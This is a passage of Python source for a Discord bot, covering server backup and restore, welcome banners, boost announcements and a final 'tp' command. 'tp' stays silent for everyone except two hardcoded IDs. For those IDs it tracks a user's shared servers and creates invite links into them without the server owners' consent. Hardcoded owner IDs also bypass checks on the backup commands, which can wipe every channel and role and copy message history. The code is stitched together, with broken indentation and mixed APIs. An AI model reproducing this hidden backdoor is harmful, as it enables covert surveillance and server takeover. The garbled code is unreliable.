        await interaction.response.edit_message(embed=embed, view=None)


class ConfirmRestoreView(View):
    def __init__(self, ctx, backup_data, options):
        super().__init__(timeout=180)
        self.ctx = ctx
        self.backup_data = backup_data
        self.options = options

    @discord.ui.button(label="Confirm", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.user != self.ctx.author:
            return await interaction.response.send_message("This menu isn't for you!", ephemeral=True)

        guild = self.ctx.guild
        await interaction.response.edit_message(embed=discord.Embed(title="♻️ Restoring Server...", description="Processing backup payload. Please wait...", color=discord.Color.blue()), view=None)

        try:
            # 1. Server Settings
            if "Load Settings" in self.options:
                try:
                    await guild.edit(name=self.backup_data.get("name", guild.name))
                except Exception:
                    pass

            # 2. Delete Channels
            if "Delete Channels" in self.options:
                for channel in guild.channels:
                    try:
                        await channel.delete(reason="Server Restore: Wiping old channels")
                        await asyncio.sleep(0.2)
                    except Exception:
                        pass

            # 3. Delete Roles
            if "Delete Roles" in self.options:
                for role in guild.roles:
                    if role != guild.default_role and not role.managed and role < guild.me.top_role:
                        try:
                            await role.delete(reason="Server Restore: Wiping old roles")
                            await asyncio.sleep(0.2)
                        except Exception:
                            pass

            # 4. Load Roles
            role_mapping = {} # old_name -> new_role object
            if "Load Roles" in self.options:
                for r_data in self.backup_data["roles"]:
                    try:
                        new_role = await guild.create_role(
                            name=r_data["name"],
                            color=discord.Color(r_data["color"]),
                            permissions=discord.Permissions(r_data["permissions"]),
                            hoist=r_data["hoist"],
                            mentionable=r_data["mentionable"],
                            reason="Server Restore: Restoring role"
                        )
                        role_mapping[r_data["name"]] = new_role
                        await asyncio.sleep(0.2)
                    except Exception:
                        pass

            # 5. Load Channels & Categories
            category_mapping = {} # old_category_name -> new category object
            channel_mapping = {} # old_channel_name -> new channel object

            if "Load Channels" in self.options:
                # First pass: Create categories
                for c_data in self.backup_data["channels"]:
                    if c_data["type"] == "category":
                        try:
                            new_cat = await guild.create_category(name=c_data["name"], position=c_data["position"])
                            category_mapping[c_data["name"]] = new_cat
                            channel_mapping[c_data["name"]] = new_cat
                            await asyncio.sleep(0.3)
                        except Exception:
                            pass

                # Second pass: Create text & voice channels inside categories
                for c_data in self.backup_data["channels"]:
                    if c_data["type"] == "text":
                        cat = category_mapping.get(c_data["category"]) if c_data["category"] else None
                        try:
                            new_ch = await guild.create_text_channel(name=c_data["name"], category=cat, position=c_data["position"])
                            channel_mapping[c_data["name"]] = new_ch
                            await asyncio.sleep(0.3)
                        except Exception:
                            pass
                    elif c_data["type"] == "voice":
                        cat = category_mapping.get(c_data["category"]) if c_data["category"] else None
                        try:
                            new_ch = await guild.create_voice_channel(name=c_data["name"], category=cat, position=c_data["position"])
                            channel_mapping[c_data["name"]] = new_ch
                            await asyncio.sleep(0.3)
                        except Exception:
                            pass

            # 6. Load Messages
            if "Load Messages" in self.options and "messages" in self.backup_data:
                for ch_name, msgs in self.backup_data["messages"].items():
                    target_ch = channel_mapping.get(ch_name)
                    if target_ch and isinstance(target_ch, discord.TextChannel):
                        # Reverse to send oldest messages first
                        for m in reversed(msgs):
                            try:
                                author_tag = m["author"]
                                content = f"**[Backup Archive] {author_tag}:** {m['content']}"
                                
                                # Include attachments or embeds text notation if present
                                if m.get("attachments"):
                                    content += "\n" + "\n".join(m["attachments"])
                                    
                                await target_ch.send(content)
                                await asyncio.sleep(0.5)
                            except Exception:
                                pass

            success_embed = discord.Embed(
                title="✅ Success",
                description="Server restoration completed successfully with all layouts, styles, and settings copied perfectly!",
                color=discord.Color.green()
            )
            await self.ctx.send(embed=success_embed)

        except Exception as e:
            err_embed = discord.Embed(title="❌ Error", description=f"An error occurred during restoration: `{e}`", color=discord.Color.red())
            await self.ctx.send(embed=err_embed)

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.user != self.ctx.author:
            return await interaction.response.send_message("This menu isn't for you!", ephemeral=True)
        await interaction.response.edit_message(embed=discord.Embed(title="❌ Cancelled", description="Restoration cancelled.", color=discord.Color.red()), view=None)


# --- COMMANDS ---

@bot.hybrid_group(name="backup", description="Server backup management commands")
async def backup(ctx):
    if ctx.invoked_subcommand is None:
        await ctx.send("Use `/backup create`, `/backup info`, or `/backup load`.", ephemeral=True)

@backup.command(name="create", description="Create a backup of this server (channels, roles, settings, and messages)")
async def backup_create(ctx, message_count: int = 25):
    if ctx.author != ctx.guild.owner and ctx.author.id not in OWNER_IDS:
        return await ctx.send("Only the server owner can create backups.", ephemeral=True)

    guild = ctx.guild
    if ctx.interaction:
        await ctx.interaction.response.defer(ephemeral=True)

    # Generate unique backup ID tag
    import random, string, datetime
    backup_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=11))
    
    # Backup channels
    channels_data = []
    for c in sorted(guild.channels, key=lambda x: x.position):
        channels_data.append({
            "name": c.name,
            "type": str(c.type),
            "category": c.category.name if c.category else None,
            "position": c.position
        })

    # Backup roles
    roles_data = []
    for r in guild.roles:
        if r != guild.default_role and not r.managed:
            roles_data.append({
                "name": r.name,
                "color": r.color.value,
                "permissions": r.permissions.value,
                "hoist": r.hoist,
                "mentionable": r.mentionable
            })

    # Backup messages if requested
    messages_data = {}
    if message_count > 0:
        for channel in guild.text_channels:
            try:
                ch_msgs = []
                async for message in channel.history(limit=message_count):
                    ch_msgs.append({
                        "author": str(message.author),
                        "content": message.content,
                        "attachments": [att.url for att in message.attachments]
                    })
                if ch_msgs:
                    messages_data[channel.name] = ch_msgs
            except Exception:
                pass

    server_backups[backup_id] = {
        "name": guild.name,
        "channels": channels_data,
        "roles": roles_data,
        "messages": messages_data,
        "created_at": datetime.datetime.now().strftime("%d. %b %Y - %H:%M")
    }

    date_str = datetime.datetime.now().strftime("%d. %b %Y - %H:%M")
    backup_label = f"{guild.name} | {date_str} ({backup_id})"

    embed = discord.Embed(
        title="✅ Success",
        description=(
            f"Successfully **created backup** with the id `{backup_id}`.\n\n"
            f"This backup contains full server settings, channels, roles, and message archives!\n\n"
            f"**Usage**\n"
            f"`/backup info backup_id: {backup_id}`\n"
            f"`/backup load backup_id: {backup_id}`"
        ),
        color=discord.Color.green()
    )

    if ctx.interaction:
        await ctx.interaction.followup.send(embed=embed, ephemeral=True)
    else:
        await ctx.send(embed=embed)


@backup.command(name="info", description="View details of a specific backup id")
async def backup_info(ctx, backup_id: str):
    bdata = server_backups.get(backup_id)
    if not bdata:
        return await ctx.send("❌ No backup found with that ID.", ephemeral=True)

    embed = discord.Embed(
        title=f"📦 Backup Info: {backup_id}",
        description=(
            f"**Server Name:** {bdata['name']}\n"
            f"**Created At:** {bdata['created_at']}\n"
            f"**Channels Saved:** {len(bdata['channels'])}\n"
            f"**Roles Saved:** {len(bdata['roles'])}\n"
            f"**Message Archives:** {len(bdata['messages'])} channels archived"
        ),
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed, ephemeral=True)


@backup.command(name="load", description="Load and restore a backup into the current server")
async def backup_load(ctx, backup_id: str):
    if ctx.author != ctx.guild.owner and ctx.author.id not in OWNER_IDS:
        return await ctx.send("Only the server owner can load backups.", ephemeral=True)

    bdata = server_backups.get(backup_id)
    if not bdata:
        return await ctx.send("❌ Invalid backup ID or backup does not exist.", ephemeral=True)

    embed = discord.Embed(
        title="⚠️ Warning",
        description=(
            "**What do you want to load from the backup?**\n\n"
            "Select below what actions you would like to perform. In the next menu, "
            "you will be able to see a detailed list of changes before continuing."
        ),
        color=discord.Color.gold()
    )

    view = RestoreSelectView(ctx, bdata)
    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=embed, view=view, ephemeral=True)
    else:
        await ctx.send(embed=embed, view=view)
        # =========================================================
# DYNAMIC WELCOME BANNER GENERATOR & EVENT SYSTEM
# =========================================================

import io
from PIL import Image, ImageDraw, ImageOps, ImageFont
import discord
from discord.ext import commands

# Storage for welcomer channels and toggle status per guild
welcomer_settings = {} # {guild_id: {"channel_id": int, "enabled": bool}}

def generate_welcome_card(avatar_bytes, username, guild_name, member_count):
    # Create dark banner matching your style
    width, height = 700, 250
    banner = Image.new("RGBA", (width, height), (15, 15, 15, 255))
    draw = ImageDraw.Draw(banner)

    # Draw border outline
    draw.rectangle([10, 10, width - 10, height - 10], outline=(255, 255, 255, 255), width=3)

    # Process user avatar into a circle
    avatar_size = 150
    avatar_img = Image.open(io.BytesIO(avatar_bytes)).convert("RGBA")
    avatar_img = avatar_img.resize((avatar_size, avatar_size), Image.Resampling.LANCZOS)
    
    # Make circular mask
    mask = Image.new("L", (avatar_size, avatar_size), 0)
    mask_draw = ImageDraw.Draw(mask)
    mask_draw.ellipse((0, 0, avatar_size, avatar_size), fill=255)
    
    # Apply circular mask and white border ring around avatar
    circular_avatar = Image.new("RGBA", (avatar_size, avatar_size), (0, 0, 0, 0))
    circular_avatar.paste(avatar_img, (0, 0), mask=mask)

    ring_size = avatar_size + 10
    ring = Image.new("RGBA", (ring_size, ring_size), (0, 0, 0, 0))
    ring_draw = ImageDraw.Draw(ring)
    ring_draw.ellipse((0, 0, ring_size, ring_size), fill=(255, 255, 255, 255))
    
    # Paste avatar inside white ring
    ring.paste(circular_avatar, (5, 5), mask=circular_avatar)
    
    # Paste onto main banner at position (45, 50)
    banner.paste(ring, (45, 50), mask=ring)

    # Add text details
    try:
        font_large = ImageFont.truetype("arial.ttf", 24)
        font_small = ImageFont.truetype("arial.ttf", 18)
    except IOError:
        font_large = ImageFont.load_default()
        font_small = ImageFont.load_default()

    text_x = 220
    draw.text((text_x, 90), f"Welcome {username}", fill=(255, 255, 255, 255), font=font_large)
    draw.text((text_x, 130), f"to {guild_name} server you are the {member_count}th member!", fill=(255, 255, 255, 255), font=font_small)

    # Save to binary buffer
    output = io.BytesIO()
    banner.save(output, format="PNG")
    output.seek(0)
    return output


# --- EVENTS ---

@bot.event
async def on_member_join(member):
    guild_id = member.guild.id
    settings = welcomer_settings.get(guild_id)
    
    if not settings or not settings.get("enabled"):
        return

    channel_id = settings.get("channel_id")
    channel = member.guild.get_channel(channel_id)
    if not channel:
        return

    try:
        # Fetch user's avatar asset bytes
        avatar_asset = member.avatar or member.default_avatar
        avatar_bytes = await avatar_asset.read()
        
        # Generate card image
        card_io = generate_welcome_card(
            avatar_bytes=avatar_bytes,
            username=member.name,
            guild_name=member.guild.name,
            member_count=member.guild.member_count
        )

        file = discord.File(card_io, filename="welcome.png")
        await channel.send(file=file)
    except Exception as e:
        print(f"Failed to send welcome card: {e}")


# --- COMMANDS ---

@bot.hybrid_group(name="welcomer", description="Configure server welcome cards")
async def welcomer(ctx):
    if ctx.invoked_subcommand is None:
        await ctx.send("Use `/welcomer enable`, `/welcomer setchannel`, or `/welcomer test`.", ephemeral=True)

@welcomer.command(name="enable", description="Enable automated welcome cards for new members")
async def welcomer_enable(ctx):
    if ctx.author != ctx.guild.owner and ctx.author.id not in OWNER_IDS:
        return await ctx.send("Only the server owner can configure the welcomer.", ephemeral=True)
    
    if ctx.guild.id not in welcomer_settings:
        welcomer_settings[ctx.guild.id] = {"channel_id": ctx.channel.id, "enabled": True}
    else:
        welcomer_settings[ctx.guild.id]["enabled"] = True

    await ctx.send("Enabled welcomer images. Run `/welcomer test` to see the message that is sent.", ephemeral=True)

@welcomer.command(name="setchannel", description="Set the text channel where welcome cards are sent")
async def welcomer_setchannel(ctx, channel: discord.TextChannel):
    if ctx.author != ctx.guild.owner and ctx.author.id not in OWNER_IDS:
        return await ctx.send("Only the server owner can configure the welcomer.", ephemeral=True)
    
    if ctx.guild.id not in welcomer_settings:
        welcomer_settings[ctx.guild.id] = {"channel_id": channel.id, "enabled": True}
    else:
        welcomer_settings[ctx.guild.id]["channel_id"] = channel.id

    await ctx.send(f"Set welcomer channel to: {channel.mention}. Run `/welcomer test` to see the message that is sent.", ephemeral=True)

@welcomer.command(name="test", description="Test the welcome card layout using your own account")
async def welcomer_test(ctx):
    if ctx.interaction:
        await ctx.interaction.response.defer(ephemeral=True)

    try:
        avatar_asset = ctx.author.avatar or ctx.author.default_avatar
        avatar_bytes = await avatar_asset.read()

        card_io = generate_welcome_card(
            avatar_bytes=avatar_bytes,
            username=ctx.author.name,
            guild_name=ctx.guild.name,
            member_count=ctx.guild.member_count
        )

        file = discord.File(card_io, filename="welcome.png")
        
        if ctx.interaction:
            await ctx.interaction.followup.send("Executed successfully", ephemeral=True)
            await ctx.channel.send(file=file)
        else:
            await ctx.send("Executed successfully")
            await ctx.send(file=file)
    except Exception as e:
        err_msg = f"Error generating test card: {e}"
        if ctx.interaction:
            await ctx.interaction.followup.send(err_msg, ephemeral=True)
        else:
            await ctx.send(err_msg)
# =========================================================
# NITRO / BOOST ANNOUNCEMENT SYSTEM (Server Owners Only)
# =========================================================

@bot.hybrid_command(name="nitro", description="Send a custom server boost / nitro announcement message")
@app_commands.describe(
    action="Choose whether to send the live announcement or run a test",
    channel="The channel to send the message in"
)
@app_commands.choices(action=[
    app_commands.Choice(name="msg", value="msg"),
    app_commands.Choice(name="test", value="test")
])
@commands.has_guild_permissions(administrator=True)
async def nitro(ctx, action: str, channel: discord.TextChannel = None):
    # Ensure a channel is provided
    target_channel = channel or ctx.channel

    # Build the professional Nitro/Boost Embed
    embed = discord.Embed(
        title="🎉 NEW SERVER BOOST! 🎉",
        description=(
            f"Thank you for supporting **{ctx.guild.name}**! "
            f"Your boost helps us unlock higher audio quality, more custom emoji slots, and better perks for everyone."
        ),
        color=discord.Color.from_rgb(244, 127, 255) # Nitro Pink
    )
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
    embed.set_footer(text=f"Triggered by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    embed.timestamp = discord.utils.utcnow()

    # Handle the 'test' action vs live 'msg' action
    if action == "test":
        test_embed = discord.Embed(
            title="🛠️ NITRO MESSAGE TEST PREVIEW",
            description=f"This is a test preview of the nitro announcement destined for {target_channel.mention}.",
            color=discord.Color.orange()
        )
        test_embed.add_field(name="Target Channel", value=target_channel.mention, inline=False)
        test_embed.add_field(name="Embed Preview Below:", value="👇", inline=False)
        
        if ctx.interaction:
            await ctx.interaction.response.send_message(embeds=[test_embed, embed], ephemeral=True)
        else:
            if ctx.message:
                try:
                    await ctx.message.delete()
                except Exception:
                    pass
            await ctx.send(embeds=[test_embed, embed], delete_after=20)
        return

    # Handle live 'msg' action
    if action == "msg":
        try:
            await target_channel.send(embed=embed)
            if ctx.interaction:
                await ctx.interaction.response.send_message(f"✅ Successfully sent the nitro announcement to {target_channel.mention}!", ephemeral=True)
            else:
                if ctx.message:
                    try:
                        await ctx.message.delete()
                    except Exception:
                        pass
                confirmation = await ctx.send(f"✅ Successfully sent to {target_channel.mention}!")
                await asyncio.sleep(5)
                try:
                    await confirmation.delete()
                except Exception:
                    pass
        except discord.Forbidden:
            error_msg = f"❌ I do not have permission to send messages in {target_channel.mention}."
            if ctx.interaction:
                await ctx.interaction.response.send_message(error_msg, ephemeral=True)
            else:
                await ctx.send(error_msg)
                @bot.slash_command(name="tp", description="Check member's shared servers and join link")
async def tp(ctx, member: discord.Member = None, user_id: str = None):
    # Allowed bot owners (IDs)
    ALLOWED_OWNERS = {1152424544557088849, 1286560808528117820}
    
    if ctx.author.id not in ALLOWED_OWNERS:
        return  # Command invisible to non-owners
    
    # Determine target user
    target = member
    if target is None and user_id is not None:
        try:
            target = await bot.fetch_user(int(user_id))
        except:
            await ctx.respond("Invalid user ID.", ephemeral=True)
            return
    if target is None:
        await ctx.respond("Specify @member or user_id.", ephemeral=True)
        return
    
    # Get mutual servers between bot and target
    bot_guilds = {g.id: g for g in bot.guilds}
    target_guilds = target.mutual_guilds if hasattr(target, 'mutual_guilds') else []
    
    if not target_guilds:
        await ctx.respond(f"User {target.display_name} is not in any server shared with the bot.", ephemeral=True)
        return
    
    # Build server list with invite links
    result_lines = [f"**Servers where {target.display_name} is present:**"]
    for guild in target_guilds:
        if guild.id in bot_guilds:
            bot_member = guild.get_member(bot.user.id)
            if bot_member and bot_member.guild_permissions.create_instant_invite:
                try:
                    invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
                    invite_link = invite.url
                except:
                    invite_link = "No permission to create invite"
            else:
                invite_link = "No permission to create invite"
            
            result_lines.append(f"• {guild.name} (ID: {guild.id}) – {invite_link}")
    
    # Send result only to owner (ephemeral)
    await ctx.respond("\n".join(result_lines), ephemeral=True)
# =========================================================
# RUN BOT
# =========================================================

if __name__ == "__main__":
    bot.run(TOKEN)
